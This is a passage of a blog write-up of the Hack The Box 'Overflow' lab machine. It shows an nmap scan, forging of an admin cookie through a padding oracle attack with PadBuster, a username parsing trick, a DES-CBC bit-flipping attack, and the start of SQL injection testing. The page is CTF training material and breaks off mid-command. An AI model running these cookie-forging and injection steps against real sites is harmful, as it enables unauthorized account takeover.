<!doctype html><html lang="en"><head><title>Overflow | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="Hack The Box. Linux. Hard machine. This machine contains a website that is vulnerable to Padding Oracle Attack and Bit Flipper Attack to login as admin and also vulnerable to SQLi by a CMS. There is another subdomain that runs a version of exiftool that has an RCE vulnerability. Once in the machine, lateral movements are relatively easy and privilege escalation consists of reversing and exploiting a Buffer Overflow vulnerability on a SUID binary. Deep knowledge on web exploitation, cryptography and binary exploitation are needed in order to compromise this machine. This write-up uses a custom Python script to perform a Bit Flipper Attack and a Ruby script to exploit SQLi"><meta name="image" content="https://7rocky.github.io/images/HTB/Overflow/Overflow.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Hack The Box. Linux. Hard machine. This machine contains a website that is vulnerable to Padding Oracle Attack and Bit Flipper Attack to login as admin and also vulnerable to SQLi by a CMS. There is another subdomain that runs a version of exiftool that has an RCE vulnerability. Once in the machine, lateral movements are relatively easy and privilege escalation consists of reversing and exploiting a Buffer Overflow vulnerability on a SUID binary. Deep knowledge on web exploitation, cryptography and binary exploitation are needed in order to compromise this machine. This write-up uses a custom Python script to perform a Bit Flipper Attack and a Ruby script to exploit SQLi"><meta itemprop="keywords" content="cve,cronjob,file-upload,suid,sqli,crypto,password-reuse,buffer-overflow,file-permissions,binary-exploitation,reversing,rce,hash-cracking,"><meta itemprop="name" content="Overflow"><meta property="article:published_time" content="2022-04-09T00:00:00+00:00"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="Hack The Box. Linux. Hard machine. This machine contains a website that is vulnerable to Padding Oracle Attack and Bit Flipper Attack to login as admin and also vulnerable to SQLi by a CMS. There is another subdomain that runs a version of exiftool that has an RCE vulnerability. Once in the machine, lateral movements are relatively easy and privilege escalation consists of reversing and exploiting a Buffer Overflow vulnerability on a SUID binary. Deep knowledge on web exploitation, cryptography and binary exploitation are needed in order to compromise this machine. This write-up uses a custom Python script to perform a Bit Flipper Attack and a Ruby script to exploit SQLi"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Overflow/Overflow.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Overflow"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/en/htb/overflow/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="Hack The Box. Linux. Hard machine. This machine contains a website that is vulnerable to Padding Oracle Attack and Bit Flipper Attack to login as admin and also vulnerable to SQLi by a CMS. There is another subdomain that runs a version of exiftool that has an RCE vulnerability. Once in the machine, lateral movements are relatively easy and privilege escalation consists of reversing and exploiting a Buffer Overflow vulnerability on a SUID binary. Deep knowledge on web exploitation, cryptography and binary exploitation are needed in order to compromise this machine. This write-up uses a custom Python script to perform a Bit Flipper Attack and a Ruby script to exploit SQLi"><meta name="twitter:description" content="Hack The Box. Linux. Hard machine. This machine contains a website that is vulnerable to Padding Oracle Attack and Bit Flipper Attack to login as admin and also vulnerable to SQLi by a CMS. There is another subdomain that runs a version of exiftool that has an RCE vulnerability. Once in the machine, lateral movements are relatively easy and privilege escalation consists of reversing and exploiting a Buffer Overflow vulnerability on a SUID binary. Deep knowledge on web exploitation, cryptography and binary exploitation are needed in order to compromise this machine. This write-up uses a custom Python script to perform a Bit Flipper Attack and a Ruby script to exploit SQLi"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Overflow/Overflow.png"><meta name="twitter:title" content="Overflow"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/htb/overflow/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/htb/overflow/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/overflow/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/overflow/&amp;text=Overflow" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/htb/overflow/&amp;title=Overflow" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Overflow</h1><time class="mt4 f6 dib tracked" datetime="2022-04-09T00:00:00+01:00">09 / 04 / 2022</time><br><p class="mb4 f6 dib tracked">26 minutes to read</p></header><div class="htb-image"><img alt="Overflow" src="/images/HTB/Overflow/Overflow.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/cve" title="CVE">CVE</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/cronjob" title="Cron jobs">Cron jobs</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/file-upload" title="File upload">File upload</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/suid" title="SUID Binary">SUID Binary</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/sqli" title="SQL Injection">SQL Injection</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/crypto" title="Cryptography">Cryptography</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/password-reuse" title="Password reuse">Password reuse</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/buffer-overflow" title="Buffer Overflow">Buffer Overflow</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/file-permissions" title="File permissions">File permissions</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/binary-exploitation" title="Binary exploitation">Binary exploitation</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/reversing" title="Reverse Engineering">Reverse Engineering</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/rce" title="Remote Code Execution">Remote Code Execution</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/hash-cracking" title="Password hash cracking">Password hash cracking</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#web-enumeration">Web enumeration</a></li><li><a href="#getting-access-as-admin">Getting access as <code>admin</code></a></li><li><a href="#finding-a-sqli">Finding a SQLi</a></li><li><a href="#exploiting-sqli">Exploiting SQLi</a></li><li><a href="#foothold-on-the-machine">Foothold on the machine</a></li><li><a href="#lateral-movement-to-developer">Lateral movement to <code>developer</code></a></li><li><a href="#lateral-movement-to-tester">Lateral movement to <code>tester</code></a></li><li><a href="#analizing-a-suid-binary">Analizing a SUID binary</a></li><li><a href="#exploiting-a-buffer-overflow">Exploiting a Buffer Overflow</a></li><li><a href="#privilege-escalation">Privilege escalation</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Hard</li><li><strong>IP Address</strong>: 10.10.11.119</li><li><strong>Release</strong>: 23 / 10 / 2021</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.119 -p 22,25,80
Nmap scan report for 10.10.11.119
Host is up (0.046s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 eb:7c:15:8f:f2:cc:d4:26:54:c1:e1:57:0d:d5:b6:7c (RSA)
|   256 d9:5d:22:85:03:de:ad:a0:df:b0:c3:00:aa:87:e8:9c (ECDSA)
|_  256 fa:ec:32:f9:47:17:60:7e:e0:ba:b6:d1:77:fb:07:7b (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: overflow, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8  
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Overflow Sec
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done -- 1 IP address (1 host up) scanned in 42.40 seconds
</code></pre></div><p>This machine has ports 22 (SSH), 25 (SMTP) and 80 (HTTP) open.</p><h2 id="web-enumeration">Web enumeration</h2><p>If we go to <code>http://10.10.11.119</code> we will see a page like this:</p><p><img src="/images/HTB/Overflow/Overflow-index.png" alt="Overflow index"></p><p>At the footer we see <code>Overflow.HTB</code>. Just in case, let&rsquo;s enter <code>overflow.htb</code> into <code>/etc/hosts</code>. The page shown in <code>http://overflow.htb</code> is the same as before.</p><p>We can register a new account clicking in &ldquo;Sign Up&rdquo;:</p><p><img src="/images/HTB/Overflow/Overflow-register.png" alt="Overflow register"></p><p>And then we will be logged in:</p><p><img src="/images/HTB/Overflow/Overflow-user-access.png" alt="Overflow user access"></p><p>There is a blog page that lists vulnerabilities such as:</p><ul><li>Outdated Softwares</li><li>Buffer Overflows</li><li>Insecure File uploads</li><li>SQL Truncation attack</li></ul><h2 id="getting-access-as-admin">Getting access as <code>admin</code></h2><p>After enumerating all the website, fuzz for routes, and test for SQL injection, we get to a dead end.</p><p>However, we can still try some attacks on the cookie. If the server is using DES CBC to generate the cookies, it might be vulnerable to Padding Oracle Attack. We can test it with <a href="https://github.com/AonCyberLabs/PadBuster"><code>PadBuster</code></a>.</p><p>To use <a href="https://github.com/AonCyberLabs/PadBuster"><code>PadBuster</code></a>, we must provide our cookie and the number of bytes per block (we can guess 8, and if it does not work, then 16):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">perl</span> padBuster.pl http://overflow.htb 4PrZDoBliCaMXXJIg3oRxLUbV72cdBks 8 -cookie <span class="code-dark-yellow">'auth=4PrZDoBliCaMXXJIg3oRxLUbV72cdBks'</span> -encoding 0  

INFO: The original request returned the following
[+] Status: 200
[+] Location: N/A
[+] Content Length: 12227

The following response signatures were returned:

-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       200     12227   N/A
2 **    255     302     0       ../logout.php?err=1
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Block 1 Results:
[+] Cipher Text (HEX): 8c5d7248837a11c4
[+] Intermediate Bytes (HEX): 9589bc7cbd52fa49
[+] Plain Text: user=7ro

...

Block 2 Results:
[+] Cipher Text (HEX): b51b57bd9c74192c
[+] Intermediate Bytes (HEX): ef360b4d867f14c1
[+] Plain Text: cky

-------------------------------------------------------
** Finished ***

[+] Decrypted value (ASCII): user=7rocky
[+] Decrypted value (HEX): 757365723D37726F636B790505050505
[+] Decrypted value (Base64): dXNlcj03cm9ja3kFBQUFBQ==
</code></pre></div><p>This tool was able to decrypt the cookie and show it in plaintext (<code>user=7rocky</code>). The same tool will be able to craft a cookie that would decrypt as <code>user=admin</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">perl</span> padBuster.pl http://overflow.htb 4PrZDoBliCaMXXJIg3oRxLUbV72cdBks 8 -cookie <span class="code-dark-yellow">'auth=4PrZDoBliCaMXXJIg3oRxLUbV72cdBks'</span> -encoding 0 -plaintext <span class="code-dark-yellow">'user=admin'</span>  

INFO: The original request returned the following
[+] Status: 302
[+] Location: home/index.php
[+] Content Length: 12227

The following response signatures were returned:

-------------------------------------------------------
ID#     Freq    Status  Length  Location
-------------------------------------------------------
1       1       200     12227   N/A
2 **    255     302     0       ../logout.php?err=1
-------------------------------------------------------

Enter an ID that matches the error condition
NOTE: The ID# marked with ** is recommended : 2

Block 2 Results:
[+] New Cipher Text (HEX): 23037825d5a1683b
[+] Intermediate Bytes (HEX): 4a6d7e23d3a76e3d

...

Block 1 Results:
[+] New Cipher Text (HEX): 0408ad19d62eba93
[+] Intermediate Bytes (HEX): 717bc86beb4fdefe

-------------------------------------------------------
** Finished ***

[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
</code></pre></div><p>And now we have a valid cookie to login as <code>admin</code>: <code>BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA</code>.</p><p>There is another way to login as <code>admin</code>. This one is much more elegant: we only need to register a new account with <code>admin=</code> as username (in fact, the number of trailing <code>=</code> does not matter).</p><p>This works because the PHP code might be using this instruction to extract the user from the decrypted cookie (or a similar instruction):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7">list</span><span class="mtk1">($a,</span> <span class="mtk1">$user)</span> <span class="mtk5">=</span> <span class="mtk7">explode</span><span class="mtk1">(</span><span class="mtk4">'='</span><span class="mtk1">,</span> <span class="mtk1">$decrypted_cookie);</span>  
</code></pre></div><p>And so, the following payloads work:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">php</span> -a
Interactive mode enabled

php &gt; list($a, $user) = explode('=', 'user=admin');
php &gt; echo $user;
admin
php &gt; list($a, $user) = explode('=', 'user=admin=');
php &gt; echo $user;
admin
php &gt; list($a, $user) = explode('=', 'user=admin====');  
php &gt; echo $user;
admin
</code></pre></div><p>And there is yet another way to get the cookie for user <code>admin</code>, that is performing a Bit Flipper Attack. This attack can be done from Burp Suite (Intruder), or it can be implemented in a custom Python script like <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Overflow/bit_flipper.py"><code>bit_flipper.py</code></a> (detailed explanation <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Overflow#bit_flipperpy">here</a>).</p><p>Since the server is using DES CBC encryption (8-length block), the decryption scheme is similar to this one:</p><p><img src="/images/HTB/Overflow/Overflow-cbc-decryption.png" alt="CBC decryption"></p><p>The idea is to register an account as <code>`dmin</code> or <code>bdmin</code>, because <code>`</code> and <code>b</code> are the nearest ASCII characters to <code>a</code>. This is the result of the script for both usernames:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> bit_flipper.py
[+] Original cookie for user `dmin: 8XriuBxV78NQchc7XKNVUHlt4qIutBEK  
[*] Bit-flip cookie for user admin: 8XriuBxU78NQchc7XKNVUHlt4qIutBEK

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> bit_flipper.py
[+] Original cookie for user bdmin: ioRhgV7BxTW2X8oR0UTI8r92y3rKsSA3
[*] Bit-flip cookie for user admin: ioRhgV7CxTW2X8oR0UTI8r92y3rKsSA3
</code></pre></div><p>The &ldquo;Bit-flip&rdquo; cookie is really similar to the original cookie, except for one letter. For example, in the cookie for user <code>`dmin</code>, the difference is letter <code>V</code>, that was transformed to an <code>U</code> to obtain a valid cookie for <code>admin</code>. To determine the difference correctly, the cookies must be decoded in Base64:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; from base64 import b64decode as b64d
&gt;&gt;&gt; b64d('8XriuBxV78NQchc7XKNVUHlt4qIutBEK').hex()  
'f17ae2b81c55efc35072173b5ca35550796de2a22eb4110a'
&gt;&gt;&gt; b64d('8XriuBxU78NQchc7XKNVUHlt4qIutBEK').hex()
'f17ae2b81c54efc35072173b5ca35550796de2a22eb4110a'
</code></pre></div><p>Here we see that the hexadecimal digits that differ are a <code>5</code> (<code>"0101"</code>) and a <code>4</code> (<code>"0100"</code>). There was a flip on the last bit of the digit <code>5</code>. What is happening can be somewhat explained with this image:</p><p><img src="/images/HTB/Overflow/Overflow-bit-flip.jpg" alt="Bit flip"></p><p><em>Source</em>: <a href="https://resources.infosecinstitute.com/topic/cbc-byte-flipping-attack-101-approach/">https://resources.infosecinstitute.com/topic/cbc-byte-flipping-attack-101-approach/</a></p><p>However, notice that the first block must decrypt as <code>user=adm</code> (8-length block) to be valid, and this time the bit-flip occurs in the sixth byte of the encrypted cookie. Therefore, the cookie is sending a certain initial vector (IV) prepended to the ciphertext; and thus the bit-flip is happening in the IV value, like this:</p><p><img src="/images/HTB/Overflow/Overflow-bit-flip2.jpg" alt="Bit flip"></p><p>Having said this, we could even create a user called <code>ZZZin</code> (plaintext cookie: <code>user=ZZZin</code>) and modify the last 3 bytes of the IV of the encrypted cookie so that the decryption results in <code>user=admin</code>. And this especial feature was added to <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Overflow/bit_flipper.py"><code>bit_flipper.py</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> bit_flipper.py
[+] Original cookie for user ZZZin: eTFj72lzhNejCV3OoG4i8OUKa8gNvdbJ  
[*] Bit-flip cookie for user admin: eTFj72lIuuCjCV3OoG4i8OUKa8gNvdbJ
</code></pre></div><p>After all this dissertation about cryptography, we have <code>admin</code> access:</p><p><img src="/images/HTB/Overflow/Overflow-admin-access.png" alt="Overflow admin"></p><h2 id="finding-a-sqli">Finding a SQLi</h2><p>As <code>admin</code> we can go to the &ldquo;Admin Panel&rdquo;, which shows a login page of CMS Made Simple:</p><p><img src="/images/HTB/Overflow/Overflow-cms-made-simple-login.png" alt="CMS Made Simple"></p><p>There are a lot of vulnerabilities for this CMS in ExploitDB. One of them is a SQL injection vulnerability (CVE-2019-9053, <a href="https://www.exploit-db.com/exploits/46635"><code>46635.py</code></a>), but the exploit does not work (it might be patched).</p><p>The exploit extracts hashes from the database, a salt for that hashes and then tries to crack them (the hashes are MD5).</p><p>Let&rsquo;s enumerate again the website to check if there is a SQL injection. As <code>admin</code> we can view some logs:</p><p><img src="/images/HTB/Overflow/Overflow-admin-logs.png" alt="Overflow admin logs"></p><p>The information shown in the modal comes from a web request to <code>http://overflow.htb/home/logs.php?name=admin</code> (performed with AJAX).</p><p>We can check here for common SQLi payloads until we get one that works (using a closing bracket):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"http://overflow.htb/home/logs.php?name=admin"</span> -H <span class="code-dark-yellow">'Cookie: auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'</span>
